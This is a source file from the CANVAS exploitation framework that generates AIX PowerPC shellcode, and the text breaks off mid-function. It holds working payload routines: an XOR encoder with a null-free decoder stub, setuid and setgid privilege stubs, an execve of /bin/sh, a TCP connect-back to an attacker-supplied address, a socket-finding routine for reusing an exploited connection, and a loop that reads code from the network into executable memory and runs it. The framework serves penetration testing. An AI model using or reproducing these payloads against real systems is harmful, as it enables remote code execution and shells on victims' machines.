##ImmunityHeader v1 
###############################################################################
## File       :  aixShellcodeGenerator.py
## Description:  
##            :  
## Created_On :  Tue Oct 27 12:00:08 2009
## Created_By :  Bas Alberts
## Modified_On:  
## Modified_On:  Tue Oct 27 12:05:12 2009
## Modified_By:  Bas Alberts
## (c) Copyright 2009, Immunity Inc all rights reserved.
###############################################################################
#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import socket
import struct

sys.path.append('.')

from MOSDEF import GetMOSDEFlibc
from MOSDEF import mosdef
from ppcShellcodeGenerator import ppc as powerpcShellcodeGenerator
from exploitutils import *
from internal import devlog 

import libs.dtspcd_client as dtspcd_client

def get_aix_version(host):
    """ get the AIX uname from dtspcd """

    try:
        dtuname =  dtspcd_client.DTSPCDClient(host)
        dtuname.setup()

        unamedict   = dtuname.get_uname()
        OS          = unamedict['os'].upper()
        if 'AIX' in OS:
            # need to know what an AIX 6 looks like !!!
            version = '5.%d' % int(unamedict['version'])
            return version

    except Exception, msg:
        import traceback
        traceback.print_exc(file=sys.stderr)
        print "[X] could not determine AIX version via DTSPCD .. assuming 5.1\n"
    
    return '5.1'

class aix_powerpc(powerpcShellcodeGenerator):
    
    def __init__(self, version = "5.1"):
        powerpcShellcodeGenerator.__init__(self)
        self.libc = GetMOSDEFlibc('AIX', 'powerpc', version)
        self.handlers['sync']                           = self.sync
        self.handlers['debug']                          = self.trap
        self.handlers["exit"]                           = self.exit
        self.handlers["read_and_exec_loop"]             = self.read_and_exec_loop
        self.handlers["read_and_exec_loop_no_errno"]    = self.read_and_exec_loop_no_errno
        self.handlers["GOOOFindSock"]                   = self.GOOOFindSock
        self.handlers["GOOOFindSock_no_errno"]          = self.GOOOFindSock_no_errno
        self.handlers["sendreg"]                        = self.sendreg
        self.handlers["munmap_caller"]                  = self.munmap_caller
        self.handlers["flushcache"]                     = self.flushcache
        self.handlers['setuid']                         = self.setuid
        self.handlers['seteuid']                        = self.seteuid
        self.handlers['setgid']                         = self.setgid
        self.handlers['setegid']                        = self.setegid
        self.handlers['setreuid']                       = self.setreuid
        self.handlers['execve']                         = self.execve
        self.handlers['tcp_connect']                    = self.tcp_connect

    # this expects assembled payload ..
    def xor_encode(self, payload, version = '5.1', xormask = 0xfe, debug = False):
        """ return an XOR encoded payload """
    
        encoded = []
        for c in payload:
            encoded.append( "%c" % (ord(c) ^ xormask))
            if ord(c) ^ xormask in [0x00]: # badchars
                devlog("aixshellcode","POSSIBLE BAD CHAR in %X ^ %X" % (ord(c), xormask) )
        encoded = ''.join(encoded)

        safe_size = 1
        while (not ((safe_size + len(encoded)) & 0xff00) or \
               not ((safe_size + len(encoded)) & 0x00ff)):
            safe_size += 1

        # safe mask that doesn't cause nul bytes
        print "Found safe size of %x" % safe_size

        decoder = """ 
        .start:
            xor. r2,r2,r2
            subic. r2,r2,1
            cmpwi r2,-1
            bgtl .start             ! preventing common bad char @
            mflr r15
            addi r15,r15, 0x0145    ! offset 17 * 4 == 0x44
            addi r15,r15,-0x0101
            xor r16,r16,r16
            addi r16,r16, 0x%x      ! size + 0x0101
            addi r16,r16,-0x%x
        .xorloop:
            lbzx r17,r16,r15
            xori r18,r17,0xfe%.2x   ! XOR
            stbx r18,r16,r15
            subic. r16,r16,1        ! yesh i know .. off by one
            cmpwi r16,-1
            bgtl .xorloop           ! preventing common bad char @
        .sync:
            addi r2,r2, 0x%x        ! SYS_sync + 0x0101
            addi r2,r2,-0x101
            crorc 6,6,6
            mtlr r15
            .long 0x44ffff02        ! svca 0 .. with no nuls
        .payload:
        """ % ( len(encoded) + safe_size, safe_size, xormask, 0x0101 + int(self.libc.getdefine('SYS_sync'))) 

        decoder = mosdef.assemble(decoder, 'PPC') + encoded

        # dump it for debugging ...
        if debug == True:
            import struct
            i = 0
            print "### pre encoding ###"
            while i < len(payload):
                print "%.8X" % struct.unpack('>L', payload[i:i+4])[0]
                i += 4
            i = 0
            print "### post encoding ###"
            while i < len(decoder):
                print "%.8X" % struct.unpack('>L', decoder[i:i+4])[0]
                i += 4

        return decoder

    def sync(self, args):
        """ sync stub """
        self.code += """
            sync
            isync
        """

    def trap(self, args):
        """ trap stub """
        self.code += """
            trap
        """

    def exit(self, args):
        code="""
            exit:
                li r2, SYS__exit
                crorc 6, 6, 6
                sc
        """
        code = self.libc.patch_defines_with_values(code, ["SYS__exit"])
        self.code += code

    def setuid(self, args):
        code="""
            setuid:
                mflr r20
                li r3, 0x%x
                li r2, SYS_setuid
                addi r20,r20,setuid_out - setuid
                mtlr r20
                crorc 6, 6, 6
                sc
            setuid_out:
        """ % args['uid']
        code = self.libc.patch_defines_with_values(code, ["SYS_setuid"])
        self.code += code
        
    def seteuid(self, args):
        code="""
            seteuid:
                mflr r20
                li r3, 0x%x
                li r2, SYS_seteuid
                addi r20,r20,seteuid_out - seteuid
                mtlr r20
                crorc 6, 6, 6
                sc
            seteuid_out:
        """ % args['uid']
        code = self.libc.patch_defines_with_values(code, ["SYS_seteuid"])
        self.code += code

    def setreuid(self, args):
        code="""
            setreuid:
                mflr r20
                li r3, 0x%x
                li r4, 0x%x
                li r2, SYS_setreuid
                addi r20,r20,setreuid_out - setreuid
                mtlr r20
                crorc 6, 6, 6
                sc
            setreuid_out:
        """ % (args['ruid'], args['euid'])
        code = self.libc.patch_defines_with_values(code, ["SYS_setreuid"])
        self.code += code
        
    def setgid(self, args):
        code="""
            setgid:
                mflr r20
                li r3, 0x%x
                li r2, SYS_setgid
                addi r20,r20,setgid_out - setgid
                mtlr r20
                crorc 6, 6, 6
                sc
            setgid_out:
        """ % args['gid']
        code = self.libc.patch_defines_with_values(code, ["SYS_setgid"])
        self.code += code
        
    def setegid(self, args):
        code="""
            setegid:
                mflr r20
                li r3, 1
                li r4, 0x%x
                li r2, SYS_setgidx
                addi r20,r20,setegid_out - setegid
                mtlr r20
                crorc 6, 6, 6
                sc
            setegid_out:
        """ % args['gid']
        code = self.libc.patch_defines_with_values(code, ["SYS_setgidx"])
        self.code += code
        
    # simple tcp connect back
    def tcp_connect(self, args):
        """
aix 5.2:/usr/include/netinet/in.h
struct in_addr {
        in_addr_t       s_addr;
};
...
/*
 * Socket address, internet style.
 */
struct sockaddr_in {
        uchar_t        sin_len;
        sa_family_t    sin_family;
        in_port_t      sin_port;
        struct in_addr sin_addr;
        uchar_t        sin_zero[8];
};
        """
        if 'ip' not in args.keys() or 'port' not in args.keys():
            print "XXX: missing ip|port arguments!"
        addr = struct.unpack('!L', socket.inet_aton(args['ip']))[0]
        #print "XXX: %X" % addr
        #print "XXX: ip %s" % args['ip']
        #print "XXX: port %d" % args['port']
        code="""
                !trap
            socket:
                mflr r20
                li r3, AF_INET
                li r4, SOCK_STREAM
                li r5, 0
                li r2, SYS_socket
                addi r20,r20,connect - socket
                mtlr r20
                crorc 6, 6, 6
                sc
            connect:
                ! r3 has fd already
                mr r30, r3          ! mosdef expects reg in r30
                stwu r1,-16(r1)     ! get stack space
                li r4, 16           
                stb r4, 0(r1)       ! sin_len
                li r4, AF_INET
                stb r4, 1(r1)       ! sin_family
                li r4, 0x%.4X
                sth r4, 2(r1)       ! sin_port
                lis r4, 0x%.4X      ! high word of address
                ori r4, r4, 0x%.4X  ! low word of address
                stw r4, 4(r1)
                xor. r4, r4, r4
                stw r4, 8(r1)       ! sin_zero
                stw r4, 12(r1)      ! sin_zero
                mr r4, r1
                li r5, 16
                li r2, SYS_connect
                addi r20,r20,connect_out - connect
                mtlr r20
                crorc 6, 6, 6
                sc
            connect_out:
                addi r1, r1, 16     ! restore stack pointer
                
        """ % (args['port'],
               (addr>>16) & 0xffff,
               (addr & 0xffff))
               
        code = self.libc.patch_defines_with_values(code, ['AF_INET',
                                                          'SOCK_STREAM',
                                                          'SYS_socket',
                                                          'SYS_connect'])
        self.code += code
    
    # simple shell execve
    def execve(self, args):
        code="""
                !trap
            execve:
                mflr r20
                addi r3, r20, shell - execve
                stw r3, -8(r1)
                xor r4, r4, r4
                mr r5, r4
                stw r4, -4(r1)
                subi r4, r1, 8
                li r2,SYS_execve
                addi r20, r20, execve_out - execve
                mtlr r20
                crorc 6, 6, 6
                sc
            shell:
                ! 8 byte aligned
                .byte 0x2f
                .byte 0x62
                .byte 0x69
                .byte 0x6e
                .byte 0x2f
                .byte 0x73
                .byte 0x68
                .byte 0x00
            execve_out:
        """
        code = self.libc.patch_defines_with_values(code, ['SYS_execve'])
        self.code += code
        
    def GOOOFindSock(self,args):
        code = """
            ! input:
            ! ------
            ! nothing
            
            ! output:
            ! -------
            ! r30 = fd
            ! r21 = GOOO_pcloc
            
            ! before all asm code (MOSDEF entry point)
            
            GOOOFindSock:
            
            ! get our current location in memory
                xor. r6, r6, r6
                bnel GOOOFindSock
                ! <-- that addr is now in $lr
            GOOO_pcloc:
                mflr r21
            
            ! sync our memory block from cache
                addi r20, r21, sync_out - GOOO_pcloc
                mtlr r20
                li r2, SYS_sync
                crorc 6, 6, 6
                sc
            sync_out:
            
            ! prepare the stack and static values
            ! sp = fp - 9456
            ! sp: [saved regs] [sa(128) 56:184] [fds(1024*8=8192) 184:8376] [buf(1024) 8376:9400] [salen(4) 9400:9404]
                stwu r1, -9456(r1)      ! save stack
                addi r22, r1, 184       ! r22:fds        ! 8192
                addi r26, r1, 56        ! r26:sa -> buf    ! 128 XXX
                addi r23, r1, 8376      ! r23:buf        ! 1024
                li r27, 128             ! r27:sizeof(ss)
                lwz r25, 9476(r1)       ! 20 + 9456 = 20(sp)
                lwz r25, 64(r25)        ! r25:&errno
                mr r29, r22             ! r29:pfds = r22:fds
                lis r5, 18255
                ori r24, r5, 20303      ! r24 = "GOOO"
            
            GOOO_main_loop:
                li r28, 0               ! nfds = 0
                li r30, 10            ! for r30:fd_temp = 1024
            
            getpeername_loop:
                stw r27, 9400(r1)       ! salen:9400(r1) = *r27
            
            ! getpeername(fd, sa, &salen);
                mr r3, r30              ! arg0 = fd_temp
                addi r4, r1, 56         ! arg1 = sa
                addi r5, r1, 9400       ! arg2 = salen
                addi r20, r21, getpeername_out - GOOO_pcloc
                mtlr r20
                li r2, SYS_ngetpeername
                crorc 6, 6, 6
                sc
            getpeername_out:
            
                cmpwi r3, -1
                bne- getpeername_succeeded ! getpeername() != -1
            ! here getpeername() returned -1
                lwz r3, 0(r25)          ! errno
                cmpwi r3, EBADF
                beq- close_badfd_out    ! if errno == EBADF, errno != [ENOTSOCK or ENOTCONN]
            
            ! getpeername() returned ENOTSOCK or ENOTCONN -> close fd
                mr r3,r30               ! arg0 = fd_temp
                addi r20, r21, close_badfd_out - GOOO_pcloc
                mtlr r20
                li r2, SYS_close
                crorc 6, 6, 6
                sc
            close_badfd_out:
            
            getpeername_preloop:
                addic. r30, r30, -1    ! fd_temp--
                bge+ getpeername_loop
            
            ! if nfds == 0 smth is wrong
                cmpwi r28, 0           ! nfds == 0 -> GOOO_failed
                beq- GOOO_failed
            
            ! LOOP set events = POLLIN
                mr r29, r22            ! r29:pfds = r22:fds
                ble- poll_set_events_done
                mtctr r28              ! r28:nfds
                li r9, POLLIN          ! events = POLLIN
                li r0, 0               ! revents = 0
            poll_set_events:
                sth r9, 4(r29)         ! pfds->events = POLLIN
                sth r0, 6(r29)         ! pfds->revents = 0
                addi r29, r29, 8       ! pfds++
                bdnz+ poll_set_events
            poll_set_events_done:
            
            call_poll:
                mr r3, r22             ! arg0 = r22:fds
                mr r4, r28             ! arg1 = r28:nfds
                li r5, INF_TIMEOUT
                addi r20, r21, call_poll_out - GOOO_pcloc
                mtlr r20
                li r2, SYS_poll
                crorc 6, 6, 6
                sc
            call_poll_out:
            
            ! check poll() returned -1
                cmpwi r3, -1
                beq- poll_returned_error
            ! check poll() returned 0
                cmpwi r3,0
                beq- GOOO_failed
            
            ! poll() returned something XXX
                mr r29, r22            ! r29:pfds = r22:fds
                li r30, 0              ! for fd_temp = 0
                cmpw r30, r28          ! fd_temp < r28:nfds
                bge- GOOO_main_loop
            
            check_next_polled_revents:
                lhz r7, 6(r29)         ! r7 = pfds->revents
                ori r6, r7, POLLIN
                cmpwi r6, 0            ! if (pfds->revents | POLLIN)
                bne- revents_IS_POLLIN
                
            revents_isnt_POLLIN:
                addi r30, r30, 1       ! fd_temp++
                addi r29, r29, 8       ! pfds++
                cmpw r30, r28          ! fd_temp < r28:nfds
                blt+ check_next_polled_revents
                b GOOO_main_loop
            
            revents_IS_POLLIN:
            ! read_magic:
                lwz r3, 0(r29)         ! arg0 = pfds->fd
                mr r4, r23             ! arg1 = r4 = r23:buf
                li r5, 4               ! arg2 = sizeof(int) = 4
                li r5, 4
                addi r20, r21, read_magic_out - GOOO_pcloc
                mtlr r20
                li r2, SYS_read
                crorc 6, 6, 6
                sc
            read_magic_out:
            
                cmpwi r3,4             ! r == sizeof(MAGIC) - 1
                beq- good_magic_size_read
            
            ! closing bad polled fd
            close_polled_fd_that_didnt_answered_well_to_trigger:
                li r2, SYS_close
                lwz r3,0(r29)          ! arg0 = pfds->fd
                addi r20, r21, close_badmagicfd_out - GOOO_pcloc
                mtlr r20
                crorc 6, 6, 6
                sc
            close_badmagicfd_out:
            
                b revents_isnt_POLLIN
            
            good_magic_size_read:
                lwz  r9, 8376(r1)      ! buf = 8376(r1)
                cmpw r9, r24           ! *lmagic == LMAGIC
                bne+ close_polled_fd_that_didnt_answered_well_to_trigger
            
            ! success MAGIC!
                lwz r30, 0(r29)        ! saved_fd = pfds->fd // saving valid_fd
            
            ! reply MAGIC
                mr r3, r30             ! arg0 = fd
                li r5, 4               ! arg2 = 4
                mr r4, r23             ! arg1 = buf
                addi r20, r21, write_trigger_out - GOOO_pcloc
                mtlr r20
                li r2, SYS_write
                crorc 6, 6, 6
                sc
            write_trigger_out:
            
            ! LOOP close all other fd
            ! here r28 = nfds
                mr r29, r22            ! r29 = r22:fds
                cmpwi r28, 0           ! while r < nfds ???
                ble- found_sockfd
                mr r31, r28            ! tmpfd = r31 = nfds
            close_all_but_saved_fd:
                lwz r3, 0(r29)         ! arg0 = pfds->fd
                addi r29, r29, 8       ! pfds++
                cmpw r30, r3           ! pfds->fd == saved_fd ?
                beq- do_not_close_the_saved_fd
            ! else close!!!
                addi r20, r21, close_all_but_saved_fd_out - GOOO_pcloc
                mtlr r20
                li r2, SYS_close
                crorc 6, 6, 6
                sc
            close_all_but_saved_fd_out:
            do_not_close_the_saved_fd:
                addic. r31, r31, -1    ! tmpfd--
                bne+ close_all_but_saved_fd
            
                b found_sockfd
            
            getpeername_succeeded:
            ! fdflags = fcntl(saved_fd, F_GETFL, 0);
                mr r3, r30             ! arg0 = fd_temp
                li r4, F_GETFL         ! arg1
                li r5, 0               ! arg2
                addi r20, r21, fcntl_getsockflags_out1 - GOOO_pcloc
                mtlr r20
                li r2, SYS_fcntl
                crorc 6, 6, 6
                sc
            fcntl_getsockflags_out1:
            
            ! flags in r3
                cmpwi r3, -1
                bne+ fcntl_getsockflags_ok1
            fcntl_getsockflags_failed1:
                li r3, 0
            fcntl_getsockflags_ok1:
                ori r5, r3, O_NONBLOCK ! arg2 = O_NONBLOCK
            
            ! fcntl(saved_fd, F_SETFL, fdflags | O_NONBLOCK);
                mr r3, r30             ! arg0 = fd_temp
                li r4, F_SETFL         ! arg1 = F_SETFL
                addi r20, r21, fcntl_out - GOOO_pcloc
                mtlr r20
                li r2, SYS_fcntl
                crorc 6, 6, 6
                sc
            fcntl_out:
            
                addi r28, r28, 1       ! nfds++;
                stw r30, 0(r29)        ! pfds->fd = fd;
                addi r29, r29, 8       ! pfds++;
                b getpeername_preloop 
            
            poll_returned_error:
            ! check poll() returned EINTR
                lwz r4, 0(r25)    ! errno
                cmpwi r4, EINTR    ! errno == EINTR?
                beq- GOOO_main_loop
            ! poll() fatal error
            
            ! _exit(random)
            GOOO_failed:
                li r2, SYS__exit
                crorc 6, 6, 6
                sc
            
            found_sockfd:
            ! out of GOOOFindSock: success
            
            ! fcntl(saved_fd, F_GETFL, 0);
                li r2, SYS_fcntl
                mr r3, r30             ! arg0 = saved_fd
                li r4, F_GETFL         ! arg1
                li r5, 0               ! arg2
                addi r20, r21, fcntl_getsockflags_out - GOOO_pcloc
                mtlr r20
                crorc 6, 6, 6
                sc
            fcntl_getsockflags_out:
            
            ! flags in r3
                cmpwi r3, -1
                bne+ fcntl_getsockflags_ok
            fcntl_getsockflags_failed:
                li r3, 0
            fcntl_getsockflags_ok:
                andi. r5, r3, O_BLOCK ! arg2
            
            ! fcntl(saved_fd, F_SETFL, ~O_NONBLOCK);
                li r2, SYS_fcntl
                mr r3, r30            ! arg0 = saved_fd
                li r4, F_SETFL        ! arg1 = F_SETFL
                addi r20, r21, fcntl_setblock_out - GOOO_pcloc
                mtlr r20
                crorc 6, 6, 6
                sc
            fcntl_setblock_out:
            
                addi r1,r1,9456    ! restore stack
            
            ! here come another code, and $pc continue executing it
            ! remember we have r30 = sockfd
        """
        syscalls  = ["SYS_sync", "SYS_ngetpeername", "SYS_poll", "SYS__exit"]
        syscalls += ["SYS_fcntl", "SYS_close", "SYS_read", "SYS_write"]
        constants = ["EBADF", "EINTR", "POLLIN", "INF_TIMEOUT", "F_GETFL", "F_SETFL", "O_NONBLOCK", "O_BLOCK"]
        code = self.libc.patch_defines_with_values(code, syscalls + constants)
        self.code+=code
        
    # for when you hose errno loc on stack ovf
    def GOOOFindSock_no_errno(self,args):
        code = """
            ! input:
            ! ------
            ! nothing
            
            ! output:
            ! -------
            ! r30 = fd
            ! r21 = GOOO_pcloc
            
            ! before all asm code (MOSDEF entry point)
            
            GOOOFindSock:
            
            ! get our current location in memory
                xor. r6, r6, r6
                bnel GOOOFindSock
                ! <-- that addr is now in $lr
            GOOO_pcloc:
                mflr r21
            
            ! sync our memory block from cache
                addi r20, r21, sync_out - GOOO_pcloc
                mtlr r20
                li r2, SYS_sync
                crorc 6, 6, 6
                sc
            sync_out:
            
            ! prepare the stack and static values
            ! sp = fp - 9456
            ! sp: [saved regs] [sa(128) 56:184] [fds(1024*8=8192) 184:8376] [buf(1024) 8376:9400] [salen(4) 9400:9404]
                stwu r1, -9456(r1)      ! save stack
                addi r22, r1, 184       ! r22:fds        ! 8192
                addi r26, r1, 56        ! r26:sa -> buf    ! 128 XXX
                addi r23, r1, 8376      ! r23:buf        ! 1024
                li r27, 128             ! r27:sizeof(ss)
                mr r29, r22             ! r29:pfds = r22:fds
                lis r5, 18255
                ori r24, r5, 20303      ! r24 = "GOOO"
            
            GOOO_main_loop:
                li r28, 0               ! nfds = 0
                li r30, 10            ! for r30:fd_temp = 1024
            
            getpeername_loop:
                stw r27, 9400(r1)       ! salen:9400(r1) = *r27
            
            ! getpeername(fd, sa, &salen);
                mr r3, r30              ! arg0 = fd_temp
                addi r4, r1, 56         ! arg1 = sa
                addi r5, r1, 9400       ! arg2 = salen
                addi r20, r21, getpeername_out - GOOO_pcloc
                mtlr r20
                li r2, SYS_ngetpeername
                crorc 6, 6, 6
                sc
            getpeername_out:
            
                cmpwi r3, -1
                bne- getpeername_succeeded ! getpeername() != -1
            
            getpeername_preloop:
                addic. r30, r30, -1    ! fd_temp--
                bge+ getpeername_loop
            
            ! if nfds == 0 smth is wrong
                cmpwi r28, 0           ! nfds == 0 -> GOOO_failed
                beq- GOOO_failed
            
            ! LOOP set events = POLLIN
                mr r29, r22            ! r29:pfds = r22:fds
                ble- poll_set_events_done
                mtctr r28              ! r28:nfds
                li r9, POLLIN          ! events = POLLIN
                li r0, 0               ! revents = 0
            poll_set_events:
                sth r9, 4(r29)         ! pfds->events = POLLIN
                sth r0, 6(r29)         ! pfds->revents = 0
                addi r29, r29, 8       ! pfds++
                bdnz+ poll_set_events
            poll_set_events_done:
            
            call_poll:
                mr r3, r22             ! arg0 = r22:fds
                mr r4, r28             ! arg1 = r28:nfds
                li r5, INF_TIMEOUT
                addi r20, r21, call_poll_out - GOOO_pcloc
                mtlr r20
                li r2, SYS_poll
                crorc 6, 6, 6
                sc
            call_poll_out:
            
            ! check poll() returned -1
                cmpwi r3, -1
                beq- poll_returned_error
            ! check poll() returned 0
                cmpwi r3,0
                beq- GOOO_failed
            
            ! poll() returned something XXX
                mr r29, r22            ! r29:pfds = r22:fds
                li r30, 0              ! for fd_temp = 0
                cmpw r30, r28          ! fd_temp < r28:nfds
                bge- GOOO_main_loop
            
            check_next_polled_revents:
                lhz r7, 6(r29)         ! r7 = pfds->revents
                ori r6, r7, POLLIN
                cmpwi r6, 0            ! if (pfds->revents | POLLIN)
                bne- revents_IS_POLLIN
                
            revents_isnt_POLLIN:
                addi r30, r30, 1       ! fd_temp++
                addi r29, r29, 8       ! pfds++
                cmpw r30, r28          ! fd_temp < r28:nfds
                blt+ check_next_polled_revents
                b GOOO_main_loop
            
            revents_IS_POLLIN:
            ! read_magic:
                lwz r3, 0(r29)         ! arg0 = pfds->fd
                mr r4, r23             ! arg1 = r4 = r23:buf
                li r5, 4               ! arg2 = sizeof(int) = 4
                li r5, 4
                addi r20, r21, read_magic_out - GOOO_pcloc
                mtlr r20
                li r2, SYS_read
                crorc 6, 6, 6
                sc
            read_magic_out:
            
                cmpwi r3,4             ! r == sizeof(MAGIC) - 1
                beq- good_magic_size_read
            
            ! closing bad polled fd
            close_polled_fd_that_didnt_answered_well_to_trigger:
                li r2, SYS_close
                lwz r3,0(r29)          ! arg0 = pfds->fd
                addi r20, r21, close_badmagicfd_out - GOOO_pcloc
                mtlr r20
                crorc 6, 6, 6
                sc
            close_badmagicfd_out:
            
                b revents_isnt_POLLIN
            
            good_magic_size_read:
                lwz  r9, 8376(r1)      ! buf = 8376(r1)
                cmpw r9, r24           ! *lmagic == LMAGIC
                bne+ close_polled_fd_that_didnt_answered_well_to_trigger
            
            ! success MAGIC!
                lwz r30, 0(r29)        ! saved_fd = pfds->fd // saving valid_fd
            
            ! reply MAGIC
                mr r3, r30             ! arg0 = fd
                li r5, 4               ! arg2 = 4
                mr r4, r23             ! arg1 = buf
                addi r20, r21, write_trigger_out - GOOO_pcloc
                mtlr r20
                li r2, SYS_write
                crorc 6, 6, 6
                sc
            write_trigger_out:
            
            ! LOOP close all other fd
            ! here r28 = nfds
                mr r29, r22            ! r29 = r22:fds
                cmpwi r28, 0           ! while r < nfds ???
                ble- found_sockfd
                mr r31, r28            ! tmpfd = r31 = nfds
            close_all_but_saved_fd:
                lwz r3, 0(r29)         ! arg0 = pfds->fd
                addi r29, r29, 8       ! pfds++
                cmpw r30, r3           ! pfds->fd == saved_fd ?
                beq- do_not_close_the_saved_fd
            ! else close!!!
                addi r20, r21, close_all_but_saved_fd_out - GOOO_pcloc
                mtlr r20
                li r2, SYS_close
                crorc 6, 6, 6
                sc
            close_all_but_saved_fd_out:
            do_not_close_the_saved_fd:
                addic. r31, r31, -1    ! tmpfd--
                bne+ close_all_but_saved_fd
            
                b found_sockfd
            
            getpeername_succeeded:
            ! fdflags = fcntl(saved_fd, F_GETFL, 0);
                mr r3, r30             ! arg0 = fd_temp
                li r4, F_GETFL         ! arg1
                li r5, 0               ! arg2
                addi r20, r21, fcntl_getsockflags_out1 - GOOO_pcloc
                mtlr r20
                li r2, SYS_fcntl
                crorc 6, 6, 6
                sc
            fcntl_getsockflags_out1:
            
            ! flags in r3
                cmpwi r3, -1
                bne+ fcntl_getsockflags_ok1
            fcntl_getsockflags_failed1:
                li r3, 0
            fcntl_getsockflags_ok1:
                ori r5, r3, O_NONBLOCK ! arg2 = O_NONBLOCK
            
            ! fcntl(saved_fd, F_SETFL, fdflags | O_NONBLOCK);
                mr r3, r30             ! arg0 = fd_temp
                li r4, F_SETFL         ! arg1 = F_SETFL
                addi r20, r21, fcntl_out - GOOO_pcloc
                mtlr r20
                li r2, SYS_fcntl
                crorc 6, 6, 6
                sc
            fcntl_out:
            
                addi r28, r28, 1       ! nfds++;
                stw r30, 0(r29)        ! pfds->fd = fd;
                addi r29, r29, 8       ! pfds++;
                b getpeername_preloop 
            
            poll_returned_error:
            ! poll() fatal error? deal with EINTR, but no errno!
            
            ! _exit(random)
            GOOO_failed:
                li r2, SYS__exit
                crorc 6, 6, 6
                sc
            
            found_sockfd:
            ! out of GOOOFindSock: success
            
            ! fcntl(saved_fd, F_GETFL, 0);
                li r2, SYS_fcntl
                mr r3, r30             ! arg0 = saved_fd
                li r4, F_GETFL         ! arg1
                li r5, 0               ! arg2
                addi r20, r21, fcntl_getsockflags_out - GOOO_pcloc
                mtlr r20
                crorc 6, 6, 6
                sc
            fcntl_getsockflags_out:
            
            ! flags in r3
                cmpwi r3, -1
                bne+ fcntl_getsockflags_ok
            fcntl_getsockflags_failed:
                li r3, 0
            fcntl_getsockflags_ok:
                andi. r5, r3, O_BLOCK ! arg2
            
            ! fcntl(saved_fd, F_SETFL, ~O_NONBLOCK);
                li r2, SYS_fcntl
                mr r3, r30            ! arg0 = saved_fd
                li r4, F_SETFL        ! arg1 = F_SETFL
                addi r20, r21, fcntl_setblock_out - GOOO_pcloc
                mtlr r20
                crorc 6, 6, 6
                sc
            fcntl_setblock_out:
            
                addi r1,r1,9456    ! restore stack
            
            ! here come another code, and $pc continue executing it
            ! remember we have r30 = sockfd
        """
        syscalls  = ["SYS_sync", "SYS_ngetpeername", "SYS_poll", "SYS__exit"]
        syscalls += ["SYS_fcntl", "SYS_close", "SYS_read", "SYS_write"]
        constants = ["EBADF", "EINTR", "POLLIN", "INF_TIMEOUT", "F_GETFL", "F_SETFL", "O_NONBLOCK", "O_BLOCK"]
        code = self.libc.patch_defines_with_values(code, syscalls + constants)
        self.code+=code

    
    def read_and_exec_loop_no_errno(self, args):
        """ use this on stack overflows that break errno loc! """
        
        mmap_protections =  self.libc.getdefine('PROT_EXEC')
        mmap_protections |= self.libc.getdefine('PROT_READ')
        mmap_protections |= self.libc.getdefine('PROT_WRITE')
        
        # we want to see if our 'fd' argument is a number or a register
        try:
            fd = int(args["fd"])
            fd_set_instr = "li"
        except ValueError:
            # i hope we got a register
            fd_set_instr = "mr"
        
        code = """
            ! r30 = fd
            ! r31 = codebuf // mmap
            ! r29 = bufsize
            ! r21 = pcloc
            ! r28 = codeptr
            ! r20 = tmp
            ! r18 = main_loop
            
            ! before all asm code (MOSDEF entry point)
            read_and_exec_loop:
            
            ! get our current location in memory
                xor. r6, r6, r6
                bnel read_and_exec_loop
                ! <-- that addr is now in $lr
            pcloc:
                mflr r21
            
        """
         
        # if fd is already in $r30 we wont set it again just because it's nicer
        # but we also save 4 bytes!!!
        if str(args["fd"]) != "r30":
            code += """
            ! set provided sockfd
                FD_SET_INSTR r30, FD   ! fd
        """
        code += """
            
            ! mmap(0, 0x10000, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_ANON, -1, 0);
                li r3, 0
                lis r4, 1
                li r5, mmap_protections
                li r6, MAP_ANON
                li r7, -1
                mr r8, r3
                addi r20, r21, mmap_out - pcloc
                mtlr r20
                li r2, SYS_mmap
                crorc 6, 6, 6
                sc
            mmap_out:
            
                cmpwi r3, MAP_FAILED
                beq- failed
                mr r31, r3             ! r31 = codebuf
            
            ! save <here> in r18 to come back directly here after exec the mmap buffer
                addi r18, r21, main_loop - pcloc
            
            main_loop:
            
            ! set the first instruction of the mmap buffer: restore lr from r18
                set r28, restore_lr_after_jmp - pcloc
                lwzx r28, r21, r28
                stw r28, 0(r31)
            
            ! read(FD, &nbytes, sizeof(nbytes));
            read_size:
                mr r3, r30             ! r30 = sockfd
                addi r4, r31, 4        ! &mmap[4]
                li r5, 4
                addi r20, r21, readsize_out - pcloc
                mtlr r20
                li r2, SYS_kread
                crorc 6, 6, 6
                sc
            readsize_out:
            
                cmplwi r3, 4 ! if (r != sizeof(nbytes))
                beq+ readsize_is_4_valid
                b failed
            readsize_is_4_valid:
                lwz r29, 4(r31)        ! r29 = *mmap[4] = codesize
                
            ! prepare r28 before read loop
                addi r28, r31, 4       ! r28 = mmap_ptr = &mmap[4]
                
            ! read(FD, codeptr, nbytes);
            read_buf:
                cmpwi r29, 0 ! while (nbytes) ! do we still need to read some bytes?
                beq- exec_code         ! if no, we can exec the recently read code
                mr r3, r30             ! arg0 = r30 = sockfd
                mr r4, r28             ! arg1 = mmap_ptr
                mr r5, r29             ! arg2 = codesize
                addi r20, r21, read_out - pcloc
                mtlr r20
                li r2, SYS_kread
                crorc 6, 6, 6
                sc
            read_out:
            
                cmpwi r3, 0
                bgt+ read_out_ok       ! we read smth
                b failed               ! no errno support on stack overflows
            read_out_ok:
                add r28, r28, r3       ! mmap_ptr += read_size
                subfc r29, r3, r29     ! codesize -= read_size
                bne- read_buf          ! if codesize != 0: continue to read on sockfd
            
            exec_code:
                mtlr r31
                li r2, SYS_sync
                crorc 6, 6, 6
                sc
            
            ! _exit(random)
            failed:
                li r2, SYS__exit
                crorc 6, 6, 6
                sc
            
            ! never reached
            
            ! following is used to patch sent code
            restore_lr_after_jmp:
                mtlr r18
        """

        syscalls = ["SYS_mmap", "SYS_kread", "SYS__exit", "SYS_sync"]
        constants = ["MAP_ANON", "MAP_FAILED"]
        code = self.libc.patch_defines_with_values(code, syscalls + constants)
        code = code.replace('mmap_protections', "%s" % mmap_protections)
        code = code.replace("FD_SET_INSTR", fd_set_instr)
        code = code.replace("FD", str(args["fd"]))
        self.code+=code
        
    def read_and_exec_loop(self, args):
        
        mmap_protections =  self.libc.getdefine('PROT_EXEC')
        mmap_protections |= self.libc.getdefine('PROT_READ')
        mmap_protections |= self.libc.getdefine('PROT_WRITE')
        
        # we want to see if our 'fd' argument is a number or a register
        try:
            fd = int(args["fd"])
            fd_set_instr = "li"
        except ValueError:
            # i hope we got a register
            fd_set_instr = "mr"
        
        code = """
            ! r30 = fd
